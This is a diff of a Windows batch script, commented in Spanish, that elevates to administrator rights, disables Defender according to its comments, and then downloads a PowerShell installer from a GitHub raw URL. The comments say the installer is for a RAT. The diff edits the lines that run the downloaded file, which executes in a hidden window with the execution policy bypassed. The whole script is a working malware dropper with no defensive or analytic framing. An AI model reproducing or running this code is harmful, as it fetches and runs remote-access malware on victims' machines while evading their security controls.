@@ -1,7 +1,7 @@
 @REM Obtener permisos de administrador script
 @echo off
 
-:-------------------------------------
+
 @REM  Verifica permisos administrativos que podremos usar para ejecutar en otros archivos.
     IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
 >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
@@ -31,5 +31,4 @@ if '%errorlevel%' NEQ '0' (
 @REM Apagar el defender 3:)
 @REM Rat obteniendo installer 
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/files/installer.ps1 -OutFile installer.ps1"
-powershell Start-Process -windowstyle hidden -ep bypass "installer.ps1"
-powershell Start-Process powershell.exe -windowstyle hidden "$env:temp/p.ps1"
+powershell Start-Process -ep bypass - c "./installer.ps1"
